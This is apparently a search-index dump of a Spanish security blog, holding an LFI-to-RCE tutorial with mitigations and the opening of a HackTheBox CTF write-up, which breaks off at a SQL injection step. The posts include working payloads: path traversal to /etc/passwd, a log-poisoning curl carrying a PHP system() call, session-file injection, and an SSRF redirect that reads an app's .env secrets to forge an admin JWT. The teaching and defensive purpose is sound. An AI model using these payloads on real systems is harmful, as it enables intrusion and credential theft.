perdi\u00f3 70 millones de euros en un ataque Business Email Compromise (BEC), donde los cibercriminales se hicieron pasar por ejecutivos de alto rango para solicitar transferencias.</p> <p>Lee m\u00e1s en Help Net Security</p> <p>Stay safe. Stay smart. Stay secure.</p>","tags":["Ciberseguridad","Fraude del CEO","BEC (Compromiso de Correo Electr\u00f3nico Empresarial)","Capacitaci\u00f3n de Empleados","Phishing","Ingenier\u00eda Social","Concienciaci\u00f3n sobre Ciberseguridad","Seguridad Corporativa"]},{"location":"es/blog/posts/06-04-2025/","title":"LFI al Descubierto: De la Inclusi\u00f3n Local a la Ejecuci\u00f3n Remota de Comandos (RCE)","text":"<p>La vulnerabilidad de Local File Inclusion (LFI) no se limita \u00fanicamente a la inclusi\u00f3n de archivos locales. En manos de un atacante experimentado puede convertirse en un vector de ataque cr\u00edtico, escalable a una situaci\u00f3n de ejecuci\u00f3n remota de comandos (RCE). Este art\u00edculo explora c\u00f3mo los atacantes aprovechan esta vulnerabilidad para comprometer servidores y qu\u00e9 medidas puedes implementar para proteger tu aplicaci\u00f3n y tu infraestructura. </p>","tags":["Seguridad Web","Path Traversal","Local File Inclusion","RCE","LogPoisoning"]},{"location":"es/blog/posts/06-04-2025/#que-es-local-file-inclusion-lfi","title":"\u00bfQu\u00e9 es Local File Inclusion (LFI)?","text":"<p>La vulnerabilidad de Local File Inclusion (LFI) se produce cuando un servidor web incluye archivos locales bas\u00e1ndose en datos proporcionados por el usuario. Este comportamiento puede aprovecharse a fin de leer archivos no accesibles desde el lado cliente y causar comportamientos inesperados en la aplicaci\u00f3n.</p>","tags":["Seguridad Web","Path Traversal","Local File Inclusion","RCE","LogPoisoning"]},{"location":"es/blog/posts/06-04-2025/#impacto-de-las-lfi","title":"Impacto de las LFI","text":"<p>Las vulnerabilidades LFI pueden generar serios problemas de seguridad en un servidor web, incluyendo:</p> <ul> <li>Acceso no autorizado a archivos sensibles y Robo de informaci\u00f3n: Un atacante puede leer archivos de configuraci\u00f3n y credenciales almacenadas en el sistema.</li> <li>Ejecuci\u00f3n de c\u00f3digo malicioso: Mediante t\u00e9cnicas avanzadas dependientes de la situaci\u00f3n un atacante podr\u00eda llegar a ejecutar c\u00f3digo arbitrario en el contexto del servidor.</li> </ul>","tags":["Seguridad Web","Path Traversal","Local File Inclusion","RCE","LogPoisoning"]},{"location":"es/blog/posts/06-04-2025/#ejemplo-de-lfi-basico","title":"Ejemplo de LFI B\u00e1sico","text":"<p>Imaginemos una aplicaci\u00f3n web desarrollada en PHP:</p> Aplicaci\u00f3n Web. <p>Tenemos una barra de b\u00fasqueda donde podemos buscar cualquier archivo. La aplicaci\u00f3n web estar\u00eda usando un c\u00f3digo similar a este:</p> <pre><code>&lt;?php\n  $file = $_GET['file'];\n  if (isset($file)){\n    include($file);\n  }\n?&gt;\n</code></pre> <p>Este c\u00f3digo espera un par\u00e1metro <code>file</code> que contendr\u00e1 el archivo que le pasemos al formulario de b\u00fasqueda. Si en el formulario ponemos un archivo como <code>hi.php</code>, la variable contendr\u00e1 dicha cadena, haciendo referencia al fichero <code>hi.php</code> en el mismo directorio que el archivo de la aplicaci\u00f3n web.</p> <p>Si realizamos la b\u00fasqueda, la URL de nuestra web cambiar\u00e1 a:</p> <pre><code>http://dominio.com/pruebas/index.php?archivo=hi.php\n</code></pre> Resultado de aplicar LFI b\u00e1sico. <p>Como prueba de concepto, intentamos acceder al archivo que contiene la configuraci\u00f3n de los usuarios en sistemas Linux, el fichero <code>/etc/passwd</code>. Como la entrada del par\u00e1metro <code>file</code> no est\u00e1 sanitizada, un atacante podr\u00eda escribir lo siguiente en la URL de la aplicaci\u00f3n web:</p> <pre><code>http://dominio.com/pruebas/index.php?archivo=/etc/passwd\n</code></pre> Acceso al fichero /etc/passwd. <p>Esto supone un grave error de seguridad, no ya por la revelaci\u00f3n de nombres de usuarios e informaci\u00f3n interna del servidor si no por que el atacante podr\u00eda acceder acceder a otros archivos del sistema como la configuraci\u00f3n de servicios, el historial de comandos o claves SSH.</p> <p>Para prevenir esto, podr\u00edamos realizar una sanitizaci\u00f3n de la entrada que recibe el par\u00e1metro <code>file</code>:</p> <pre><code>&lt;?php\n  $file = $_GET['file'];\n  if (isset($file)){\n    include(\"/var/www/html\" . $file);\n  }\n?&gt;\n</code></pre> Acceso al fichero /etc/passwd restringido. <p>Con este cambio, el acceso a los ficheros que no est\u00e1n contenidos en la ruta <code>/var/www/html</code> est\u00e1 restringido, aumentando levemente la seguridad en nuestro servidor. Sin embargo, esta mitigaci\u00f3n no est\u00e1 completa, ya que existen otras t\u00e9cnicas que permiten eludir este tipo de mitigaci\u00f3n, como veremos a continuaci\u00f3n.</p>","tags":["Seguridad Web","Path Traversal","Local File Inclusion","RCE","LogPoisoning"]},{"location":"es/blog/posts/06-04-2025/#lfi-con-path-traversal","title":"LFI con Path Traversal","text":"<p>Ahora, consideremos una aplicaci\u00f3n web m\u00e1s robusta, donde los payloads b\u00e1sicos para LFI no funciona, ya que la web contiene este c\u00f3digo:</p> <pre><code>&lt;?php\n  $file = $_GET['file'];\n  if (isset($file)){\n    include(\"/var/www/html\". $file);\n  }\n?&gt;\n</code></pre> <p>Esta protecci\u00f3n impide acceder a cualquier archivo fuera del directorio especificado. Sin embargo, esta restricci\u00f3n puede ser eludida mediante Path Traversal.</p> <p>El Path Traversal, tambi\u00e9n conocido como Directory Traversal, es una t\u00e9cnica para acceder a archivos y directorios fuera del directorio permitido por la aplicaci\u00f3n web. Se logra utilizando secuencias como <code>../</code> para subir niveles en el sistema de archivos.</p> <p>Si una aplicaci\u00f3n tiene un filtro que solo restringe archivos en su directorio de trabajo, se puede usar Path Traversal junto con LFI para acceder a archivos del sistema. Por ejemplo:</p> <pre><code>https://dominio.com/pruebas/index.php?file=../../../../../../../../../../../etc/passwd\n</code></pre> Acceso al archivo /etc/passwd del servidor. <p>Este tipo de ataque es muy peligroso cuando se combina con LFI, ya que puede permitir a un atacante acceder a archivos cr\u00edticos del sistema, incluyendo configuraciones, credenciales y registros de actividad del servidor. Adem\u00e1s, es com\u00fan escalar estos ataques a una ejecuci\u00f3n remota de comandos, ya sea realizando un ataque de <code>LogPoisoning</code> o incluyendo una <code>Web Shell</code> en el servidor.</p>","tags":["Seguridad Web","Path Traversal","Local File Inclusion","RCE","LogPoisoning"]},{"location":"es/blog/posts/06-04-2025/#de-lfi-a-rce-remote-code-execution","title":"De LFI a RCE (Remote Code Execution)","text":"<p>La transici\u00f3n de una vulnerabilidad de Local File Inclusion (LFI) a Remote Code Execution (RCE) es una t\u00e9cnica avanzada que los atacantes pueden emplear para comprometer un sistema por completo. Estos m\u00e9todos son bastante dependientes del lenguaje en el que se escribe la aplicaci\u00f3n y de configuraciones especificas del servidor, los m\u00e9todos m\u00e1s comunes para lograr pasar de un LFI a RCE son los siguientes:</p>","tags":["Seguridad Web","Path Traversal","Local File Inclusion","RCE","LogPoisoning"]},{"location":"es/blog/posts/06-04-2025/#inclusion-de-archivos-de-registro-con-inyeccion-de-codigo-log-poissoning","title":"Inclusi\u00f3n de archivos de registro con inyecci\u00f3n de c\u00f3digo (Log Poissoning)","text":"<p>Si el servidor web registra las solicitudes en archivos de log accesibles, un atacante puede inyectar c\u00f3digo malicioso en dichos registros y luego incluirlos mediante LFI. Por ejemplo:</p> <ol> <li>El atacante env\u00eda una solicitud maliciosa que inyecta c\u00f3digo PHP en los logs del servidor:</li> </ol> <pre><code>curl -A \"&lt;?php system('whoami'); ?&gt;\" http://dominio.com\n</code></pre> <p>Aqu\u00ed, el c\u00f3digo PHP se inyecta en el archivo de logs del servidor web (por ejemplo, <code>/var/log/apache2/access.log</code>).</p> <ol> <li>Luego, utiliza LFI para incluir el archivo de log:</li> </ol> <pre><code>http://dominio.com/pruebas/index.php?file=../../../../../../var/log/apache2/access.log\n</code></pre> <p>Esto ejecutar\u00e1 el c\u00f3digo PHP inyectado, permitiendo al atacante ejecutar comandos en el servidor.</p> Acceso a los logs de acceso de Apache via LFI. <p>Como se puede observar al final del log, se refleja que hemos accedido al directorio especificado. Esto significa que el contenido de la variable proporcionada en la URL ha sido procesado por el servidor, permitiendo al atacante visualizar informaci\u00f3n sensible o ejecutar c\u00f3digo malicioso si el archivo incluido contiene instrucciones ejecutables.</p> <p>De igual manera y dependiendo del log que podamos leer se puede inyectar el c\u00f3digo a ejecutar en los logs del servicio web (a trav\u00e9s del User-Agent por ejemplo), en los logs del SSH (mediante el nombre de usuario) e incluso en logs custom de la aplicaci\u00f3n mediante diversos par\u00e1metros.</p>","tags":["Seguridad Web","Path Traversal","Local File Inclusion","RCE","LogPoisoning"]},{"location":"es/blog/posts/06-04-2025/#que-ocurre-exactamente","title":"\u00bfQu\u00e9 ocurre exactamente?","text":"<ul> <li>PHP usa <code>include()</code> para interpretar el archivo especificado.</li> <li>Al incluir el log, se encuentra con una l\u00ednea que contiene <code>&lt;?php system('id'); ?&gt;</code>.</li> <li>PHP ejecuta esa l\u00ednea como si fuera parte del c\u00f3digo original.</li> <li>El resultado del comando <code>id</code> se muestra en la respuesta HTTP.</li> </ul>","tags":["Seguridad Web","Path Traversal","Local File Inclusion","RCE","LogPoisoning"]},{"location":"es/blog/posts/06-04-2025/#inclusion-de-sesiones-php","title":"Inclusi\u00f3n de Sesiones PHP","text":"<p>Cuando PHP almacena datos de sesi\u00f3n en archivos (configuraci\u00f3n predeterminada), estos se guardan en un directorio definido por <code>session.save_path</code> en el archivo <code>php.ini</code>. Si un atacante obtiene acceso a estos archivos mediante Local File Inclusion (LFI), puede inyectar y ejecutar c\u00f3digo malicioso.</p>","tags":["Seguridad Web","Path Traversal","Local File Inclusion","RCE","LogPoisoning"]},{"location":"es/blog/posts/06-04-2025/#flujo-de-ataque","title":"Flujo de Ataque","text":"<ol> <li>Inyecci\u00f3n de C\u00f3digo en la Sesi\u00f3n:     El atacante inicia una sesi\u00f3n y modifica su contenido para incluir c\u00f3digo PHP:</li> </ol> <pre><code>&lt;?php\n session_start();\n $_SESSION['malicioso'] = \"&lt;?php system('id'); ?&gt;\";\n?&gt;\n</code></pre> <p>Esto guarda el payload en el archivo de sesi\u00f3n (ej: <code>/var/lib/php/sessions/sess_abc123</code>).</p> <ol> <li>Explotaci\u00f3n mediante LFI:     Si el servidor permite incluir archivos fuera del directorio ra\u00edz: <code>url     http://dominio.com/index.php?file=../../../../var/lib/php/sessions/sess_abc123</code>    El c\u00f3digo PHP inyectado se ejecutar\u00e1, permitiendo ejecutar comandos como <code>id</code>.</li> </ol>","tags":["Seguridad Web","Path Traversal","Local File Inclusion","RCE","LogPoisoning"]},{"location":"es/blog/posts/06-04-2025/#por-que-son-sensibles-los-archivos-de-sesion","title":"\u00bfPor qu\u00e9 son Sensibles los Archivos de Sesi\u00f3n?","text":"<ul> <li>Ubicaci\u00f3n Accesible: Por defecto, PHP almacena sesiones en directorios como <code>/var/lib/php/sessions</code> (Linux) o <code>C:\\Windows\\Temp</code> (Windows). Si estos archivos est\u00e1n dentro del alcance del servidor web (ej: <code>DocumentRoot</code>), podr\u00edan ser incluidos mediante LFI.</li> <li>Formato de Almacenamiento: Los archivos de sesi\u00f3n contienen datos en texto plano con el formato. Si el valor incluye c\u00f3digo PHP sin sanitizar, se ejecutar\u00e1 al ser incluido.</li> </ul>","tags":["Seguridad Web","Path Traversal","Local File Inclusion","RCE","LogPoisoning"]},{"location":"es/blog/posts/06-04-2025/#mitigaciones","title":"Mitigaciones","text":"<p>La prevenci\u00f3n de vulnerabilidades como Local File Inclusion (LFI) requiere un enfoque integral que combine buenas pr\u00e1cticas de desarrollo, configuraciones seguras del servidor y monitoreo constante. Las mitigaciones no solo deben enfocarse en evitar la explotaci\u00f3n inicial, sino tambi\u00e9n en limitar el impacto de un posible ataque. A continuaci\u00f3n, se presentan estrategias clave para proteger tus aplicaciones y sistemas frente a LFI a su posible escalada a Remote Code Execution (RCE) y prevenir la inclusion de sesiones en PHP.</p>","tags":["Seguridad Web","Path Traversal","Local File Inclusion","RCE","LogPoisoning"]},{"location":"es/blog/posts/06-04-2025/#mitigaciones-para-prevenir-lfi-a-rce","title":"Mitigaciones para prevenir LFI a RCE","text":"<p>Para evitar que una vulnerabilidad de LFI escale a RCE, se deben implementar las siguientes medidas:</p> <ol> <li> <p>Validaci\u00f3n estricta de entradas:</p> <p>Utilizar listas blancas para limitar los archivos que pueden ser incluidos, adem\u00e1s de rechazar caracteres como <code>../</code>, y otros que permitan Path Traversal.</p> <ul> <li> <p>Listas Blancas (Whitelisting):</p> </li> <li> <p>Concepto: Permite solo un conjunto espec\u00edfico de archivos o rutas que son consideradas seguras.</p> </li> <li>Ejemplo: Si tu aplicaci\u00f3n necesita incluir solo archivos <code>.php</code> desde un directorio espec\u00edfico, define una lista blanca que solo permita esos archivos.</li> </ul> <pre><code>&lt;?php\n$allowed_files = [\n    'home.php',\n    'about.php',\n    'contact.php'\n];\n\n$file = $_GET['file'];\n\nif (in_array($file, $allowed_files)) {\n    include('/var/www/html/pages/' . $file);\n} else {\n    echo \"Archivo no permitido.\";\n}\n?&gt;\n</code></pre> <p>En este ejemplo, solo los archivos <code>home.php</code>, <code>about.php</code> y <code>contact.php</code> pueden ser incluidos. Cualquier otro archivo ser\u00e1 rechazado.</p> <ul> <li> <p>Rechazar Caracteres Peligrosos:</p> <ul> <li>Concepto: Bloquea caracteres y secuencias que facilitan el Path Traversal y otras manipulaciones.</li> <li>Ejemplo: Eliminar o rechazar secuencias como <code>../</code>, <code>..\\\\</code>, y otros caracteres especiales.</li> </ul> </li> </ul> <pre><code>&lt;?php\nfunction sanitizePath($input) {\n    // Decodificar URL primero para evitar bypass con caracteres codificados\n    $input = urldecode($input);\n\n    // Eliminar secuencias de traversal en todas sus variantes\n    $input = str_replace(['../', '..\\\\', '.../', '....//'], '', $input);\n\n    // Eliminar caracteres no permitidos (solo letras, n\u00fameros, guiones y puntos)\n    $input = preg_replace('/[^a-zA-Z0-9\\-\\.\\/]/', '', $input);\n\n    return $input;\n}\n\n$file = sanitizePath($_GET['file']);\n$basePath = '/var/www/html/pages/';\n$fullPath = realpath($basePath . $file . '.php');\n\n// Validaci\u00f3n final con realpath()\nif ($fullPath &amp;&amp; strpos($fullPath, $basePath) === 0) {\n    include($fullPath);\n} else {\n    echo \"Acceso denegado: Ruta no v\u00e1lida.\";\n}\n?&gt;\n</code></pre> <p>Realizar una combinaci\u00f3n de sanitizaci\u00f3n proactiva, validaci\u00f3n estricta de caracteres y comprobaci\u00f3n con <code>realpath()</code> cierra m\u00faltiples vectores de ataque. Sin embargo, las listas blancas siguen siendo la estrategia m\u00e1s robusta contra LFI.</p> </li> <li> <p>Deshabilitar funciones peligrosas:</p> <p>Configurar <code>allow_url_include=Off</code> y <code>allow_url_fopen=Off</code> en <code>php.ini</code> y deshabilitar funciones como <code>system()</code>, <code>exec()</code>, <code>shell_exec()</code>, y similares.</p> <ul> <li> <p><code>allow_url_include</code> y <code>allow_url_fopen</code>:</p> </li> <li> <p>Concepto: Estas directivas permiten incluir archivos desde URLs remotas. Deshabilitarlas previene la inclusi\u00f3n de c\u00f3digo desde fuentes externas, reduciendo el riesgo de RCE.</p> </li> <li> <p>Configuraci\u00f3n: En el archivo <code>php.ini</code>, aseg\u00farate de que est\u00e9n configuradas como <code>Off</code>:</p> <pre><code>allow_url_include = Off\nallow_url_fopen = Off\n</code></pre> </li> <li> <p>Deshabilitar Funciones Cr\u00edticas:</p> <ul> <li>Concepto: Funciones como <code>system()</code>, <code>exec()</code>, <code>shell_exec()</code>, <code>passthru()</code> y <code>popen()</code> permiten la ejecuci\u00f3n de comandos del sistema. Deshabilitarlas o restringir su uso impide que los atacantes ejecuten c\u00f3digo arbitrario.</li> <li>Configuraci\u00f3n: En el archivo <code>php.ini</code>, utiliza la directiva <code>disable_functions</code>:</li> </ul> <pre><code>disable_functions = system,exec,shell_exec,passthru,popen,proc_open,curl_exec,curl_multi_exec,parse_ini_file,show_source\n</code></pre> </li> </ul> <p>Esto deshabilita las funciones listadas, impidiendo su uso en el c\u00f3digo PHP.</p> </li> <li> <p>Aislar archivos sensibles:</p> <p>Almacenar archivos de configuraci\u00f3n, logs y sesiones fuera del directorio accesible por la aplicaci\u00f3n web.</p> <ul> <li>Concepto: Almacena archivos de configuraci\u00f3n, logs y sesiones fuera del directorio ra\u00edz accesible por la web.</li> <li> <p>Ejemplo:</p> </li> <li> <p>Logs: Guarda los archivos de log en un directorio como <code>/var/log/app/</code> que no sea accesible directamente a trav\u00e9s de la web.</p> </li> <li>Configuraci\u00f3n: Almacena los archivos de configuraci\u00f3n en un directorio como <code>/etc/app/</code> y aseg\u00farate de que el usuario del servidor web no tenga permisos de lectura.</li> <li>Sesiones: Configura PHP para guardar las sesiones en un directorio seguro fuera del alcance del servidor web, como <code>/var/lib/php/sessions/</code>.</li> </ul> <p>En el archivo <code>php.ini</code>:</p> <pre><code>session.save_path = \"/var/lib/php/sessions\"\n</code></pre> <p>Aseg\u00farate de que solo el usuario del sistema tenga acceso a este directorio.</p> </li> <li> <p>Configurar permisos adecuados:</p> <p>Restringir los permisos de lectura y escritura en archivos y directorios cr\u00edticos.</p> <ul> <li>Concepto: Restringe los permisos de lectura y escritura en archivos y directorios cr\u00edticos.</li> <li> <p>Ejemplo:</p> </li> <li> <p>Utiliza <code>chmod</code> para configurar los permisos de los archivos. Por ejemplo, para un archivo de configuraci\u00f3n:</p> <pre><code>chmod 600 /etc/app/config.ini\nchown root:root /etc/app/config.ini\n</code></pre> <p>Esto da permisos de lectura y escritura solo al usuario root.</p> </li> <li> <p>Directorios:</p> <pre><code>chmod 700 /var/log/app/\nchown www-data:www-data /var/log/app/\n</code></pre> <p>Esto da permisos de lectura, escritura y ejecuci\u00f3n al usuario <code>www-data</code>, que es el usuario del servidor web, y restringe el acceso a otros usuarios.</p> </li> </ul> </li> <li> <p>Monitorear y auditar:</p> <p>Revisar regularmente los logs del servidor para detectar actividades sospechosas e implementar herramientas de detecci\u00f3n de intrusos (IDS) para identificar intentos de explotaci\u00f3n.</p> <ul> <li> <p>Revisar Logs del Servidor:</p> </li> <li> <p>Concepto: Analiza regularmente los logs del servidor web y de la aplicaci\u00f3n para detectar patrones sospechosos, errores inusuales o intentos de acceso a archivos no autorizados.</p> </li> <li> <p>Ejemplo: Busca en los logs patrones como:</p> <ul> <li>Intentos de acceder a archivos sensibles (<code>/etc/passwd</code>, archivos de configuraci\u00f3n).</li> <li>Errores de inclusi\u00f3n de archivos.</li> <li>Solicitudes con caracteres sospechosos (<code>../</code>).</li> </ul> </li> <li> <p>Implementar un WAF (Web Application Firewall):</p> </li> <li> <p>Concepto: Utiliza un firewall de aplicaciones web (WAF) para proteger aplicaciones expuestas a internet contra ataques como Path Traversal, inyecci\u00f3n de c\u00f3digo y otras amenazas comunes.</p> </li> <li>Ejemplo: Configura un WAF como ModSecurity o servicios en la nube como Cloudflare para filtrar y bloquear solicitudes maliciosas.</li> </ul> <p>Estas herramientas son ideales para proteger aplicaciones web en entornos expuestos a internet, proporcionando una capa adicional de seguridad.</p> </li> </ol>","tags":["Seguridad Web","Path Traversal","Local File Inclusion","RCE","LogPoisoning"]},{"location":"es/blog/posts/06-04-2025/#mitigaciones-para-prevenir-inclusion-de-sesiones-en-php","title":"Mitigaciones para prevenir inclusion de sesiones en PHP","text":"<ol> <li>Mover Archivos de Sesi\u00f3n Fuera del Alcance del Servidor Web:    Configurar <code>session.save_path</code> en <code>php.ini</code> para usar un directorio no accesible desde la web:</li> </ol> <pre><code>session.save_path = \"/var/secure/sessions\"\n</code></pre> <p>Asegurar permisos: <code>chmod 600 /var/secure/sessions</code>.</p> <ol> <li>Validaci\u00f3n Estricta en LFI:    Usar listas blancas y sanitizaci\u00f3n de rutas:</li> </ol> <pre><code>$allowed = ['home', 'about'];\nif (!in_array($_GET['file'], $allowed)) die(\"Acceso denegado\");\n</code></pre> <ol> <li>Sanitizar Datos de Sesi\u00f3n:    Validar y filtrar entradas antes de almacenarlas en <code>$_SESSION</code>:</li> </ol> <pre><code>$_SESSION['usuario'] = htmlspecialchars($input);\n</code></pre> <ol> <li>Configurar <code>open_basedir</code>:    Restringir el acceso a directorios espec\u00edficos:</li> </ol> <pre><code>open_basedir = /var/www/html:/var/secure/sessions\n</code></pre> <ol> <li>Usar Almacenamiento Alternativo:    Cambiar el manejador de sesiones a bases de datos o memoria:</li> </ol> <pre><code>ini_set('session.save_handler', 'redis');\nini_set('session.save_path', 'tcp://127.0.0.1:6379');\n</code></pre>","tags":["Seguridad Web","Path Traversal","Local File Inclusion","RCE","LogPoisoning"]},{"location":"es/blog/posts/06-04-2025/#conclusion","title":"Conclusi\u00f3n","text":"<p>La vulnerabilidad de Local File Inclusion (LFI) es un recordatorio de c\u00f3mo una mala gesti\u00f3n de las entradas del usuario puede convertirse en un vector de ataque cr\u00edtico. Aunque puede parecer una falla menor, su combinaci\u00f3n con t\u00e9cnicas avanzadas como Path Traversal o Log Poisoning puede escalar r\u00e1pidamente a una ejecuci\u00f3n remota de comandos (RCE), comprometiendo por completo la seguridad de un sistema.</p> <p>La clave para mitigar este tipo de vulnerabilidades radica en la implementaci\u00f3n de buenas pr\u00e1cticas de desarrollo seguro, como la validaci\u00f3n estricta de entradas, el uso de listas blancas, la configuraci\u00f3n adecuada del servidor y la desactivaci\u00f3n de funciones peligrosas. Adem\u00e1s, el monitoreo constante y la auditor\u00eda de los sistemas son esenciales para detectar y prevenir intentos de explotaci\u00f3n.</p> <p>En \u00faltima instancia, la seguridad no es un estado, sino un proceso continuo. Adoptar un enfoque proactivo y mantener una mentalidad de mejora constante es fundamental para proteger tus aplicaciones y tu infraestructura frente a amenazas como LFI.</p> <p>Stay safe. Stay smart. Stay secure.</p>","tags":["Seguridad Web","Path Traversal","Local File Inclusion","RCE","LogPoisoning"]},{"location":"es/blog/posts/08-12-2024/","title":"Challenge, Train, Flag: Blueprint Heist","text":"<p>En Atlansec, estamos comprometidos con los CTFs como una herramienta clave de aprendizaje bajo la metodolog\u00eda de aprender haciendo. Creemos que enfrentar retos pr\u00e1cticos es la mejor manera de desarrollar habilidades t\u00e9cnicas y fomentar la creatividad. Con esta secci\u00f3n queremos difundir el valor de los CTFs, compartir writeups de Retos de cierta complejidad t\u00e9cnica y acercar a la comunidad a un enfoque pr\u00e1ctico y t\u00e9cnico del aprendizaje.</p>","tags":["Ciberseguridad","Pentesting","CTF","Code Review","SSRF","JWT","SQL Injection","WebSecurity","HackTheBox","NodeJS"]},{"location":"es/blog/posts/08-12-2024/#que-es-un-ctf","title":"\u00bfQu\u00e9 es un CTF?","text":"<p>Las competiciones de capturar la bandera (CTF) son Retos de ciberseguridad donde los participantes se enfrentan a una serie de problemas t\u00e9cnicos para encontrar \"banderas\", que son marcadores ocultos que demuestran que se ha completado con \u00e9xito una tarea. Los CTFs simulan situaciones de la vida real en \u00e1reas como la criptograf\u00eda, ingenier\u00eda inversa, seguridad web, an\u00e1lisis forense y explotaci\u00f3n de binarios, ayudando a los participantes a adquirir habilidades esenciales en ciberseguridad.</p> <p>Los CTFs no solo son una competici\u00f3n; son la puerta de entrada al aprendizaje mediante la resoluci\u00f3n de problemas. Ense\u00f1an a los participantes a pensar de forma cr\u00edtica, a depurar sistemas complejos, y a adaptarse bajo presi\u00f3n. Cada Reto es una historia, un rompecabeza y una lecci\u00f3n todo en uno.</p> <p>En esta serie, exploraremos Retos CTF notables, nos sumergiremos en sus soluciones t\u00e9cnicas y destacaremos las habilidades que desarrollan. \u00a1Bienvenido a Reto, Entrenamiento, Bandera!</p>","tags":["Ciberseguridad","Pentesting","CTF","Code Review","SSRF","JWT","SQL Injection","WebSecurity","HackTheBox","NodeJS"]},{"location":"es/blog/posts/08-12-2024/#conceptos-claves","title":"Conceptos claves","text":"<ul> <li> <p>SSRF (Server-Side Request Forgery): Es una t\u00e9cnica que permite al atacante a forzar a un servidor a realizar peticiones HTTP en su nombre. Dependiendo del contexto, puede ser bastante cr\u00edtico ya que puede permitir a un atacante acceder a recursos dentro de la red interna del objetivo.</p> </li> <li> <p>JSON Web Token (JWT): Es un est\u00e1ndar abierto para autenticar y transferir informaci\u00f3n de forma segura utilizando un token.</p> </li> <li> <p>Inyecci\u00f3n SQL: Ataque que permite inyectar c\u00f3digo SQL malicioso en una consulta para manipular la consulta de la base de datos.</p> </li> <li> <p>wkhtmltopdf: Librer\u00eda para convertir contenido web (HTML) en PDF.</p> </li> </ul>","tags":["Ciberseguridad","Pentesting","CTF","Code Review","SSRF","JWT","SQL Injection","WebSecurity","HackTheBox","NodeJS"]},{"location":"es/blog/posts/08-12-2024/#el-reto","title":"El Reto","text":"<p>En esta ocasi\u00f3n os traemos un reto de HTB Business CTF 2024. El reto es de la categor\u00eda web y aunque est\u00e1 catalogado como f\u00e1cil en la plataforma de HackTheBox, es uno de los retos web m\u00e1s complejos de la plataforma debido al n\u00famero de pasos que componen la soluci\u00f3n.</p> <p>En este reto se nos da el c\u00f3digo fuente de una aplicaci\u00f3n NoseJS y acceso a un servicio web que ejecuta la aplicaci\u00f3n.</p>","tags":["Ciberseguridad","Pentesting","CTF","Code Review","SSRF","JWT","SQL Injection","WebSecurity","HackTheBox","NodeJS"]},{"location":"es/blog/posts/08-12-2024/#entendiendo-la-logica-de-la-aplicacion","title":"Entendiendo la L\u00f3gica de la Aplicaci\u00f3n","text":"<p>El reto comienza con el acceso a la aplicaci\u00f3n de la comisi\u00f3n de urbanismo. Al navegar, nos damos cuenta que al pulsar sobre cualquiera de los enlaces se genera una petici\u00f3n POST a la ruta /download. Revisemos su implementaci\u00f3n en el archivo de rutas:</p> <pre><code>router.post(\"/download\", authMiddleware(\"guest\"), (req, res, next) =&gt; {\n    convertPdf(req, res, next);\n});\n</code></pre> <p>Aqu\u00ed podemos ver que la funci\u00f3n convertPdf es la responsable de manejar la l\u00f3gica de esta ruta. Vamos a examinar su c\u00f3digo:</p> <pre><code>async function convertPdf(req, res, next) {\n    try {\n        const { url } = req.body;\n\n        if (!isUrl(url)) {\n            return next(generateError(400, \"Invalid URL\"));\n        }\n\n        const pdfPath = await generatePdf(url);\n        res.sendFile(pdfPath, { root: \".\" });\n    } catch (error) {\n        return next(generateError(500, error.message));\n    }\n}\n</code></pre> <p>Despu\u00e9s de leerlo, podemos ver que la funci\u00f3n se asegura que el par\u00e1metro que recibe es una URL v\u00e1lida antes de pasarla a la funci\u00f3n generatePdf. Veamos esto \u00faltimo:</p> <pre><code>async function generatePdf(urls) {\n    const pdfFilename = generateRandomFilename();\n    const pdfPath = `uploads/${pdfFilename}`;\n\n    try {\n        await generatePdfFromUrl(urls, pdfPath);\n        return pdfPath;\n    } catch (error) {\n        throw new Error(`Error generating PDF: ${error.stack}`);\n    }\n}\n\nasync function generatePdfFromUrl(url, pdfPath) {\n    return new Promise((resolve, reject) =&gt; {\n        wkhtmltopdf(url, { output: pdfPath }, (err) =&gt; {\n            if (err) {\n                reject(err);\n            } else {\n                resolve();\n            }\n        });\n    });\n}\n</code></pre> <p>Observamos que la funci\u00f3n generatePdfFromUrl usa wkhtmltopdf para convertir el contenido de la URL en un archivo PDF. Este flujo abre la puerta a una vulnerabilidad SSRF en la librer\u00eda.</p>","tags":["Ciberseguridad","Pentesting","CTF","Code Review","SSRF","JWT","SQL Injection","WebSecurity","HackTheBox","NodeJS"]},{"location":"es/blog/posts/08-12-2024/#ssrf-para-la-lectura-de-archivos-en-wkhtmltopdf","title":"SSRF para la lectura de archivos en wkhtmltopdf","text":"<p>Utilizando un servidor controlado por el atacante, podemos servir archivos en un servidor web para redirigir al visitante a ubicaciones locales en el sistema de archivos, en este caso convirtiendo el SSRF en una forma de leer archivos internos como /etc/passwd. Para hacer esto, creamos un archivo PHP con el siguiente contenido:</p> <pre><code>&lt;?php header('location:file:///etc/passwd'); ?&gt;\n</code></pre> <p>Al pasar la URL de nuestro servidor como par\u00e1metro a la ruta /download, el PDF generado contendr\u00e1 el contenido del archivo /etc/passwd del servidor que realiza la petici\u00f3n.</p> Leyendo el /etc/passwd con el generador de PDF <p>A continuaci\u00f3n, modificamos el archivo PHP para exfiltar el archivo .env de la aplicaci\u00f3n:</p> <pre><code>&lt;?php header('location:file:///app/.env'); ?&gt;\n</code></pre> Leyendo el archivo .env con el generador de PDF","tags":["Ciberseguridad","Pentesting","CTF","Code Review","SSRF","JWT","SQL Injection","WebSecurity","HackTheBox","NodeJS"]},{"location":"es/blog/posts/08-12-2024/#falsificacion-del-jwt","title":"Falsificaci\u00f3n del JWT","text":"<p>Con la clave extra\u00edda del archivo .env, podemos firmar tokens JWT v\u00e1lidos. Usamos una herramienta como JWT.io para generar el token con el rol de administrador:</p> <pre><code>{\n  \"role\": \"admin\"\n}\n</code></pre> Editar token JWT en JWT.io <p>Usando el token que hemos generado, haremos una petici\u00f3n al endpoint interno del panel de administraci\u00f3n con la siguiente estructura:</p> <pre><code>http://127.0.0.1:1337/admin?token=&lt;JWT_admin&gt;\n</code></pre> <p>En el PDF generado podemos ver el contenido del panel de administraci\u00f3n. Aunque esto genera una captura de pantalla del panel de administraci\u00f3n, s\u00f3lo nos lleva la mitad del camino de nuestro objetivo final.</p> PDF con el contenido del panel de administraci\u00f3n","tags":["Ciberseguridad","Pentesting","CTF","Code Review","SSRF","JWT","SQL Injection","WebSecurity","HackTheBox","NodeJS"]},{"location":"es/blog/posts/08-12-2024/#inyeccion-sql-a-la-subida-del-archivo","title":"Inyecci\u00f3n SQL a la subida del archivo","text":"<p>Analizando el resto del c\u00f3digo de la aplicaci\u00f3n, descubrimos que el endpoint GraphQL es vulnerable a Inyecci\u00f3n SQL en la consulta getDataByName. Sin embargo, se utiliza una expresi\u00f3n regular robusta para filtrar las entradas maliciosas:</p> 